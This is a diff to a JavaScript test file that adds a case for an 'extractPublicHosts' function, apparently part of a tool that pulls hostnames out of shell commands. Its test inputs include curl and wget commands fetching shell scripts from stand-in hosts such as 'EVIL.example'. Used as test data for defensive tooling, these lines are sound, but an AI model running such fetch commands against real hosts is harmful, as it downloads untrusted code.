@@ -88,6 +88,10 @@ test("invalid JSON -> null (silent degradation)", async () => {
   }
 });
 
+test("extractPublicHosts: uppercase HTTPS scheme matched, host lowercased", () => {
+  assert.deepEqual(extractPublicHosts("curl HTTPS://UpperHost.example/x.sh"), ["upperhost.example"]);
+});
+
 test("extractPublicHosts: unique hosts, lowercased, port stripped", () => {
   const hosts = extractPublicHosts(
     "curl https://EVIL.example/x.sh && wget https://evil.example:8443/y && curl https://other.example/z",
